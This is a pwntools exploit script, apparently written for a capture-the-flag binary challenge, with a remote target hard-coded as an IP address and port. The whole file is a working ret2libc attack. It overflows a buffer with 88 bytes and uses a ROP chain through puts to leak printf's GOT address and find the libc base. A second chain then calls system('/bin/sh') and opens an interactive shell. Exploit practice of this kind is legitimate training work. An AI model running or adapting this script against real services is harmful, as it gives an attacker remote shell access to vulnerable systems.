from pwn import *
import sys

# local binary file
binary = "./bin/chall"
# format 'nc host port', 'host port', or 'host:port'
remote_target = "nc 65.21.255.31 13370"
remote_libc = "./lib/libc.so.6"

# clear context and set for challenge
context.clear()
context.terminal = ["konsole", "-e"]  # set as needed for you terminal
context.binary = binary

gdbscript = """
break *main+345
continue
"""


def parse_remote(target):
    rtgt = remote_target.split(" ")
    if len(rtgt) < 2:
        log.error(f"Invalid Remote Target \"{target}\"")
        sys.exit(1)
    elif len(rtgt) == 2 or len(rtgt) == 3:
        start_pos = 0 if len(rtgt) == 2 else 1
        try:
            comm = remote(rtgt[start_pos], int(rtgt[start_pos+1]), typ="tcp")
            libc = ELF(remote_libc)
            return comm, libc
        except:
            log.error(f"Failed to connect to \"{target}\"")
    else:
        log.error(f"Failed to parse format for \"{target}\"")


def main():
    if args.REMOTE:
        log.info("Remote Throw")
        comm, libc = parse_remote(remote_target)

    else:
        log.info("Local Throw")
        comm = process(binary)
        libc = comm.libc
        libc.address = 0
        if args.GDB:
            log.info("Attaching GDB")
            gdb.attach(comm, gdbscript=gdbscript)

    print(libc)
    bin_rop = ROP(binary)
    bin_elf = ELF(binary)
    libc_rop = ROP(libc)

    pop_rdi = bin_rop.rdi
    binsh = next(libc.search(b"/bin/sh"))
    nop_ret = 0x000000000040118f

    # offset + 8 spots to account for call stack
    comm.recvuntil(b"size:")
    comm.sendline(b"15$s%")
    comm.recvuntil(b"data:")
    payload = b"A"*88
    payload += p64(pop_rdi.address)
    payload += p64(bin_elf.symbols['got.printf'])
    payload += p64(bin_elf.symbols['puts'])
    payload += p64(bin_elf.symbols['main'])
    comm.sendline(payload)

    printf_leak = u64(comm.recvline().strip().ljust(8, b"\x00"))
    print(f"Leaked printf: {hex(printf_leak)}")
    libc_base = printf_leak - libc.symbols['printf']
    libc_system = libc_base + libc.symbols['system']
    binsh += libc_base
    print(f"LIBC Base: {hex(libc_base)}")
    print(f"LIBC System: {hex(libc_system)}")
    print(f"/bin/sh: {hex(binsh)}")

    comm.recvuntil(b"size:")
    comm.sendline(b"15$s%")
    comm.recvuntil(b"data:")
    payload = b"A"*88
    payload += p64(nop_ret)  # movaps
    payload += p64(pop_rdi.address)
    payload += p64(binsh)
    payload += p64(libc_system)
    comm.sendline(payload)

    comm.interactive()


if __name__ == "__main__":
    main()
